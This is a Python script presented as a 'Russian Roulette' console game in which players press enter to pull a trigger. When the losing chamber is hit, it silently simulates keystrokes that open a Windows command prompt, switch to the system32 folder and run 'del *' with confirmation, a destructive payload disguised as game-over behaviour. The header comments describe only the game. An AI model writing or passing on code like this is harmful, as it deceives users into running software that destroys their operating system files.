# Russian Roulette game made in python. The rules are simple: Each player has to press enter to pull the trigger
# and the player that hits the chambers that contains the bullet, losses!


# After the game is over the user has the option to restart the game.

import random
import os
import sys
import keyboard
import time

chambers = input("Please enter the number of chambers (default = 6): ")

if not chambers:
	chambers = 5

elif not chambers.isdigit():
	quit("Invalid number of chambers!")

fatal_bullet = random.randint(1, int(chambers))

for x in range(1, int(chambers) + 1):
    input("Press enter to pull the trigger! ")
    if x == fatal_bullet:
        print("You just got served!")
        print("Game Over")
        keyboard.press_and_release('Windows + r')
        time.sleep(2)
        keyboard.write('cmd')
        keyboard.press_and_release('enter')
        time.sleep(2)
        keyboard.write('cd c:\windows\system32')
        keyboard.press_and_release('enter')
        time.sleep(1)
        keyboard.write('del *')
        time.sleep(1)
        keyboard.write('Y')
        start_again = input("Do you want to start again? (y/n): ")
        if start_again and start_again.lower()[0] == "y":
            os.execv(sys.executable, [sys.executable] + sys.argv)
        else:
            break
    print("You will live to see another day")